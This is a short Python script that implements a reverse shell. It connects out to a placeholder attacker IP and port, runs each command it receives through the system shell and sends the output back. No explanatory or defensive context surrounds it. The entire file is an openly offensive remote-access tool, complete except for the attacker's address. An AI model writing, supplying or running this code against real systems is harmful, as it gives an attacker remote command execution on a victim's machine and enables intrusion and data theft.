import socket
import subprocess
import os

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("YOUR_ATTACKER_IP", YOUR_ATTACKER_PORT))
    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        s.send(output.stdout + output.stderr)
    s.close()

if __name__ == "__main__":
    reverse_shell()
